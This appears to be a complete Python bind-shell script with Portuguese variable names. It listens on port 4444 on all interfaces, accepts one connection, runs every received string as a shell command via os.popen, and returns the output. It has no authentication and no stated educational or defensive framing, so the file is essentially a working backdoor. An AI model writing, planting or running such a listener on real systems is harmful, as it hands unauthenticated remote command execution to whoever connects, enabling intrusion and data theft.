import socket
import os

ip = '0.0.0.0'
porta = 4444
servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.bind((ip, porta))
servidor.listen(1)
(conexao, cliente) = servidor.accept()

while True:
	comando = conexao.recv(1024)
	if not comando:
		break
	resultado = os.popen(comando).read()
	conexao.sendall(resultado)
conexao.close()
